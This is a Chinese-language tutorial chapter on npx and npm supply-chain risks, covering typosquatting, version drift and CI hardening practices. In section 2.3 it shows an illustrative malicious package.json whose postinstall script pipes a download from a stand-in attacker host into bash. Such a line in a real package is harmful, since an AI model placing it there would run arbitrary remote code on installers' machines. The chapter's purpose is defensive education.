# 05 - npx 安全实践与供应链风险

> 🎯 npx 的本质是"从远程拉取代码并执行" — 每个 npx 命令都是一次供应链信任决策。理解攻击面、锁定版本、规范 CI，才能安全使用这个利器

---

## 目录

1. [为什么 npx 有安全风险](#1-为什么-npx-有安全风险)
2. [常见攻击场景](#2-常见攻击场景)
3. [安全使用最佳实践](#3-安全使用最佳实践)
4. [企业环境与 CI 安全](#4-企业环境与-ci-安全)

---

## 1. 为什么 npx 有安全风险

npx 的便利性恰恰是它的攻击面：**未安装的工具会从 registry 拉取任意代码并在你的机器上执行**。

| 风险点 | 说明 |
|--------|------|
| 远程代码执行 | npx 临时下载的包包含任意代码（pre/postinstall 脚本） |
| 自动执行钩子 | npm 包可声明 `preinstall` / `postinstall` 脚本，下载即触发 |
| 默认拉最新 | `npx some-tool` 默认取 `latest` 标签，版本漂移不可控 |
| 缓存复用 | `_npx` 缓存中的旧版可能被复用，无法感知 |
| 与 npm 装依赖不同 | `npm install` 后有 lockfile 可审计；npx 的临时安装**没有** lockfile |

> ⚠️ **本质**：`npx some-tool` 应视为**运行不可信软件**，与 Java 中执行任意远程 jar 同等风险级别（且无沙箱隔离）。

---

## 2. 常见攻击场景

### 2.1 拼写劫持（Typosquatting）

```bash
# 恶意包会注册近似名字，等待拼错
npx create-vue-app        # ❌ 近似官方 create-vue 的恶意包
npx create-vite-app       # ❌ 近似 create-vite
npx eslit                 # ❌ 拼错 eslint
```

> 💡 攻击者把恶意包发布到 npm registry 上，名字与知名工具仅差一个字母。拼写错误 → 拉到恶意包 → postinstall 执行恶意脚本。

### 2.2 版本漂移（Version Drift）

```bash
npx prettier              # 不带版本 → 每次可能拉到不同的 latest
npx -y some-tool          # -y 跳过确认 → 无人工审查直接执行
```

> 💡 无版本约束时，某天 upstream 发布恶意版本（或账户被盗），团队 CI 立即中招 — 这就是经典的 **供应链攻击**（如 event-stream、colors 事件）。

### 2.3 安装后脚本投毒

```json
// 恶意包的 package.json（下载即执行）
{
  "scripts": {
    "postinstall": "curl http://attacker.example/payload.sh | bash"
  }
}
```

> 💡 npm 包安装时会执行 `preinstall` / `postinstall` 脚本 — 这正是 npm 生态供应链攻击（如 `ua-parser-js`、`node-ipc` 事件）的主要载体。

---

## 3. 安全使用最佳实践

| 实践 | 命令/做法 | 说明 |
|------|-----------|------|
| **固定版本** | `npx prettier@3.3.3` | 版本确定性优先于便利性 |
| **用 --no 拒绝远程** | `npx --no some-tool` | 只跑本地已装，绝不拉远程 |
| **声明后 npm run** | 写进 package.json 用 `npm run` | 有 lockfile，可审计可复现 |
| **审计依赖** | `npm audit` | 扫描已知漏洞（对标 OWASP Dependency Check） |
| **审查新包** | `npm view <pkg>` | 先看版本、依赖、维护活跃度 |
| **少用 -y** | 交互环境去掉 `-y` | 保留人工确认机会 |
| **锁 registry** | `npm config set registry <内网>` | 内网私服，阻断公网投毒 |

```bash
# 安全执行模板
npx prettier@3.3.3 --version                          # 1. 固定版本
npx -p eslint@8.57.0 eslint --version                  # 2. -p 精确提供
npx --no http-server dist/                             # 3. 只用本地
npm audit --audit-level=high                            # 4. 定期审计
```

> 💡 **Java 后端对标**：固定版本 = 在 `pom.xml` 锁定版本号；`npm audit` = OWASP Dependency Check；声明进 package.json = 依赖纳入版本管理；内网 registry = Nexus 私服。

---

## 4. 企业环境与 CI 安全

### 4.1 CI 铁律（GitLab CI / GitHub Actions / Jenkins）

| 规则 | 说明 |
|------|------|
| `npm ci` 精确安装 | 只装 lockfile 中固定的版本，可复现构建 |
| 只执行 lockfile 中已安装的二进制 | `npm run lint`，不 `npx eslint`（临时拉取） |
| 禁止裸 npx | CI 中 `npx some-tool` 一律写成固定版本或 `--no` |
| lockfile 必须入库 | 依赖变更走 code review |
| 依赖审计进流水线 | `npm audit` 失败即阻断（对标 `mvn verify` 的安全插件） |

```yaml
# CI 安全模板
stages: [security, build]
security:
  stage: security
  script:
    - npm ci
    - npm audit --audit-level=high     # 高危漏洞阻断
    - npx --no prettier --check src/   # 仅本地二进制
    - npm run build
```

### 4.2 企业内网部署

```bash
# 1. 指向内网私服（Verdaccio / Nexus npm 仓库）
npm config set registry http://nexus.example.com/repository/npm-group/

# 2. 锁定团队一致版本
echo "registry=http://nexus.example.com/repository/npm-group/" >> .npmrc
```

| 措施 | 作用 |
|------|------|
| 内网 registry | 阻断公网恶意包，统一供应源 |
| `.npmrc` 入库 | 团队统一配置，防止个人配置漂移 |
| 私服代理 + 白名单 | 只同步审查过的包到内网 |

### 4.3 最小权限

```bash
# CI 用只读 token 安装依赖，发布用单独的高权限 token
npm ci --ignore-scripts        # 极端场景：禁止安装脚本（谨慎，部分包会失效）
```

> ⚠️ **注意**：`--ignore-scripts` 会破坏依赖 esbuild、sharp 等需要 install 脚本的包，仅作最后防线使用。

---

> 🎯 **核心要点**：npx 安全三原则 — ① **固定版本**（`pkg@x.y.z` 或 `-p`）② **CI 只跑 lockfile 二进制**（`npm ci` + `npm run`）③ **内网 registry + 依赖审计**。把每个 npx 命令当作一次"运行远程代码"的决策，供应链攻击就无从下手。

**返回总览**：[00-npx知识体系总览](00-npx知识体系总览.md)
